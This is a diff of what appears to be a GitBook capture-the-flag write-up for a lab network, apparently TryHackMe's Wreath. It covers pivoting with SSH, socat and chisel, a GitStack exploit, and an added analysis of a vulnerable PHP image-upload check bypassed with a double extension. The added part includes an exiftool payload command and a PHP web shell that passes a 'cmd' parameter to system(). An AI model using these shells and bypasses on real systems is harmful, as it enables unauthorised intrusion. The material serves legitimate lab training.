@@ -152,7 +152,7 @@ for i in {21 80 111 135 139 445 443 8080 3389}; do (echo > /dev/tcp/10.200.87.20
 
 I used a static nmap binary file and scan the internal networks from the victim 10.200.87.200 and found 3 other hosts.
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>pivot enumeration.</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>pivot enumeration.</p></figcaption></figure>
 
 ### <mark style="color:red;">Proxychains & Foxyproxy</mark>
 
@@ -206,12 +206,12 @@ There are two ways to create a forward SSH tunnel using the SSH client --> **por
   `ssh -L 9051:10.200.87.150:80 root@10.200.87.200 -fN`\
   &#x20;The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Access webpage hosted on port 80 10.200.87.150, from our kali localhost:9051</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Access webpage hosted on port 80 10.200.87.150, from our kali localhost:9051</p></figcaption></figure>
 
 * **Proxies (forward proxy)** are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:\
   `ssh -D 1337 root@10.200.87.150 -fN`
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption><p>Proxy connection to 10.200.87.150</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>Proxy connection to 10.200.87.150</p></figcaption></figure>
 
 Now we can even scan entire 65535 port:
 
@@ -229,7 +229,7 @@ The relay connects back to a listener started using an alias to a standard netca
 
 In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.
 
-<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption><p>Socat Reverse Shell Relay</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>Socat Reverse Shell Relay</p></figcaption></figure>
 
 ### <mark style="color:red;">3 - Chisel</mark>
 
@@ -247,9 +247,9 @@ This connects _back_ from a compromised server to a listener waiting on our atta
 
 `./chisel server client $kaliIP:1081 R:socks` - on victim.
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption><p>Reverse Socks Proxy</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>Reverse Socks Proxy</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption><p>Accessing 10.200.87.150:80</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>Accessing 10.200.87.150:80</p></figcaption></figure>
 
 My bad: its actually 127.0.0.1:8080 to access the webserver.
 
@@ -412,25 +412,25 @@ Our server: `python3 -m http.server 80` .
 
 So it’s an error page. There are 3 endpoints `/registration/login` `/gitstack` and `/rest`
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>http://10.200.87.150/gitstack</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption><p>http://10.200.87.150/gitstack</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption><p>searching google for available exploit</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>searching google for available exploit</p></figcaption></figure>
 
 We got one from exploit-db --> [https://www.exploit-db.com/exploits/43777](https://www.exploit-db.com/exploits/43777)
 
 We edited the "ip address" and "cmd" using nano.
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>modifying exploit</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption><p>modifying exploit</p></figcaption></figure>
 
 `python2 43777.py` - running exploit.
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>we got "nt authority"</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption><p>we got "nt authority"</p></figcaption></figure>
 
 We can also check the uploaded "exploit.php" using curl
 
 `curl -X POST http://10.200.87.150/web/exploit.php -d "a=whoami"` -
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here we want to obtain a full reverse shell. We have two options for this:
 
@@ -441,7 +441,7 @@ Option number two is a lot quieter than option number 1, so let's use that.
 
 Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world.
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>we can't ping outside</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption><p>we can't ping outside</p></figcaption></figure>
 
 But we see we are able to ping our Jump host.
 
@@ -458,7 +458,7 @@ Before we can do this, however, we need to take one other thing into account. Ce
 `firewall-cmd --zone=public --add-port 20000/tcp`&#x20;
 {% endhint %}
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>added a firewall rule to allow imbound traffic from tcp port 20000</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>added a firewall rule to allow imbound traffic from tcp port 20000</p></figcaption></figure>
 
 {% hint style="success" %}
 We used nishang powershell reverse shell oneliner below.
@@ -712,13 +712,136 @@ To analyze this .git directory we use a tool named "GitTools" which is available
 We use it to extract information for the downloaded git directory.
 {% endhint %}
 
+After running "GitTools" on the "website.git" renamed to ".git" folder, it extracted 3 folders which corresponds to the 3 commits we saw when we ran "git log" earlier.
+
+It's up to us to piece together the order of the commits. Fortunately there are only three commits in this repository, and each commit comes with a `commit-meta.txt` file which we can use to get an idea of the order.
+
+We could just cat each of these files out separately, but we may as well do it the fancy way with a bash one-liner:
+
+We could just cat each of these files out separately, but we may as well do it the fancy way with a bash one-liner:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+s="========================"; for i in $(ls);do cd $i && echo $s && cat commit-meta.txt && printf "\n\n" && cd ..;done
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+From the metadata we can easily guess the commit order which is:
+
+1. 70dde80cc19ec76704567996738894828f4ee895
+2. 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+3. 345ac8b236064b431fa43f53d91c98c4834ef8f3
+
+<mark style="color:orange;">The short version / conclusion is --> the most up to date version of the site stored in the Git repository is in the</mark> <mark style="color:orange;"></mark><mark style="color:orange;">`NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3`</mark> <mark style="color:orange;"></mark><mark style="color:orange;">directory</mark>
+
+### Website Code Analysis
+
+Head into the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3/` directory.
+
+The `index.html` file isn't promising -- realistically we need some PHP, which we identified as the webserver's back-end language earlier.
+
+Let's look for PHP files using `find`:\
+`find . -name "*.php"`
+
+Only one result:\
+`./resources/index.php`
+
+Reading the Hint on the Question: i figured there's a "todo" list somewhere, so i used grep to search.
+
+`grep -iRl 'todo' .` - while in the "345ac..." directory.
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>the todo list.</p></figcaption></figure>
+
+Especially the 3rd bullet is interesting. This tells us that this page might be protected by basic auth.
+
+The rest of the code is responsible for the file upload:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```php
+<?php
+
+	if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
+		$target = "uploads/".basename($_FILES["file"]["name"]);
+		$goodExts = ["jpg", "jpeg", "png", "gif"];
+		if(file_exists($target)){
+			header("location: ./?msg=Exists");
+			die();
+		}
+		$size = getimagesize($_FILES["file"]["tmp_name"]);
+		if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
+			header("location: ./?msg=Fail");
+			die();
+		}
+		move_uploaded_file($_FILES["file"]["tmp_name"], $target);	
+		header("location: ./?msg=Success");
+		die();
+	} else if ($_SERVER["REQUEST_METHOD"] == "post"){
+		header("location: ./?msg=Method");
+	}
 
 
+	if(isset($_GET["msg"])){
+		$msg = $_GET["msg"];
+		switch ($msg) {
+			case "Success":
+				$res = "File uploaded successfully!";
+				break;
+			case "Fail":
+				$res = "Invalid File Type";
+				break;
+			case "Exists":
+				$res = "File already exists";
+				break;
+			case "Method":
+				$res = "No file send";
+				break;
+		
+		}
+	}
+?>
+```
+{% endcode %}
 
+#### Code Explanation
 
+In line 5, the allowed extensions are defined. Apparently, we are only able to upload `jpg,jpeg,png and gif` files. The crucial part of this file upload is in line 11. Here, it is checked whether the uploaded filename actually is one of the defined allowed extensions. This is done using the `explode()` function. The `explode()` function separates the string at the specified separator (in this case it’s a dot `.`). This means that e.g. the filename `test.jpg` will be converted to an array: \[“test”,”jpg”]. Next, the element at index 1 is compared to the allowed extensions. This is obviously vulnerable, as it assumes, that the uploaded file ALWAYS has EXACTLY ONE file extension. But what happens if we rename the file to `test.jpg.php`. Then, the file-name is still allowed because it has the extension `.jpg` at index 1. This way, we can upload `php` files!
 
+So now that we know that we can exploit the file upload, let’s try to access it!
 
+### Exploit POC
 
+One of the Todos hinted towards an existing HTTP Basic Auth mechanism that protects the upload functionality located at `10.200.85.100/resources/index.php`. And indeed! If we try to access this website, we are prompted with a login form. However, we are in posession of Thomas’ credentials! Let’s use them and see if it works: `thomas : i<3ruby` .
+
+<figure><img src="https://korbinian-spielvogel.de/assets/post_images/thm_wreath/wreath_ruby_image_upload.png" alt=""><figcaption><p>we are in.</p></figcaption></figure>
+
+The easiest place to stick the shell is in the exifdata for the image -- specifically in the `Comment` field to keep it nicely out of the way.
+
+We can then use `exiftool` to check the exifdata of the file:\
+`exiftool -Comment="Test Payload\"; die(); ?>" test.png` - update the Comment section of the image. rename the file to "test.png.php"
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+When we upload the file, we view the file:
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Next, we can include PHP code that takes a GET parameter as input for the system() function. This way we can get a decent web shell.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+<?
+php echo "<pre>" . system($_GET['cmd']) . "</pre>";
+?>
+```
+{% endcode %}
+
+Upload it again and access it while also appending the parameter `?cmd=whoami`. Huh …. we do not get any output. Let’s try other commands such as `ipconfig`…. Nothing works. Maybe the file was detected by an AV.
+
+## AV Evasion
 
 
 
